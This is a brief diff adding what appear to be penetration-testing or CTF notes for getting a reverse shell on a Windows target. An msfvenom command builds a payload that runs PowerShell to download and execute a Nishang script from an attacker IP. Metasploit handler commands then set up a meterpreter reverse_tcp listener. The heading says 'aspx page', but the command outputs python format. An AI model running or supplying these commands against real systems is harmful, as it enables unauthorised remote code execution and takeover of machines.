@@ -1,0 +1,11 @@
+
+
+create a reverse shell aspx page:
+msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('http://IP/nishang.ps1')\"" -f python
+
+
+On Metasploit side open handler:
+msfconsole
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST 10.10.14.16
